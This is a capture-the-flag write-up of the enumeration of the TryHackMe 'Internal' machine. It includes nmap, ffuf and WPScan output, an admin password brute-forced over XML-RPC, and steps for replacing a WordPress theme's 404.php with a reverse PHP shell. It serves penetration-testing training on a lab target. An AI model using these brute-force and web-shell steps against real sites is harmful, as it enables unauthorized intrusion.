---
sidebar_position: 1
description: Internal
sidebar_label: Enumeration
keywords: [internal, tryhackme, ctf, pentesting, guide, docs, tutorial, enumeration, exploitation, nmap, ffuf, wpscan, xml-rpc, wordpress exploit, privilege escalation]
---

# [Internal] Enumeration

:::note Box Description

Penetration Testing Challenge.

:::


## NMAP

- <b style={{ color: 'Coral' }}>[SSH: 22]</b> <b style={{ color: 'LightSkyBlue' }}>[HTTP: 80]</b>

```log
Nmap scan report for 10.10.90.155
Host is up (0.085s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


## FFUF

- <b style={{ color: 'PowderBlue' }}>WordPress:</b> <b style={{ color: 'SandyBrown' }}>[IP:80/blog]</b>
- <b style={{ color: 'FireBrick' }}>PHPMyAdmin</b> <span style={{fontWeight: 'Bold'}}>Login Portal:</span> <b style={{ color: 'SandyBrown' }}>[IP:80/phpmyadmin]</b>

```log
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.90.155/FUZZ
 :: Wordlist         : FUZZ: Dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

blog                    [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 117ms]
wordpress               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 154ms]
javascript              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 114ms]
phpmyadmin              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 111ms]
```


## HOSTS

- Our `hosts` File needs to Reflect **`internal.thm`**

```log
# Standard host addresses
127.0.0.1  localhost
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
# This host address
127.0.1.1  virtual-box
// highlight-next-line
MACHINE_IP internal.thm
```


<br/>

---
## Content Discovery
- **Default Apache Page:** <b style={{ color: 'SandyBrown' }}>[IP:80]</b>
- <b style={{ color: 'PowderBlue' }}>WordPress</b> <span style={{fontWeight: 'Bold'}}>Login Portal:</span> <b style={{ color: 'SandyBrown' }}>[IP:80/blog/wp-login.php]</b>

![IA](/img/vmlinux/i-login.png)

---

<br/>


## WPScan

- <b style={{ color: 'PowderBlue' }}>WordPress</b> <span style={{fontWeight: 'Bold'}}>Version:</span> <b style={{ color: 'Plum' }}>5.4.2</b>
- **`XML-RPC` Enabled**

```log
[+] URL: http://internal.thm/blog/ [10.10.90.155]
[+] Started: Fri Oct  7 08:00:25 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

// highlight-next-line
[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.0
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'
```

<br/>

- **Brute-Forcing Username**
- **Found Username:** <b style={{ color: 'Chartreuse' }}>admin</b>

```log
[i] User(s) Identified:

// highlight-next-line
[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

<br/>

- **Brute-Forcing Password**
- **Found Password:** <b style={{ color: 'Coral' }}>my2boys</b>

```log
[+] Performing password attack on Xmlrpc against 1 user/s
// highlight-next-line
[SUCCESS] - admin / my2boys

[!] Valid Combinations Found:
// highlight-next-line
 | Username: admin, Password: my2boys
```

<br/>

---
## Content Discovery

- **Using** <b style={{ color: 'PowderBlue' }}>WordPress</b> <span style={{fontWeight: 'Bold'}}>Credentials to Login:</span> <b style={{ color: 'Chartreuse' }}>admin</b><b style={{ color: 'Grey' }}>:</b><b style={{ color: 'Coral' }}>my2boys</b>


![IA](/img/vmlinux/i-dashboard.png)


- **Replacing `404.php` with a Reverse PHP Shell**
- `WordPress -> Appearance -> Theme Editor -> 404 Template (404.php)` 
- **Reverse Shell Execution Location:** `http://IP/blog/wp-content/themes/twentyseventeen/404.php`

![IA](/img/vmlinux/i-payload.png)

---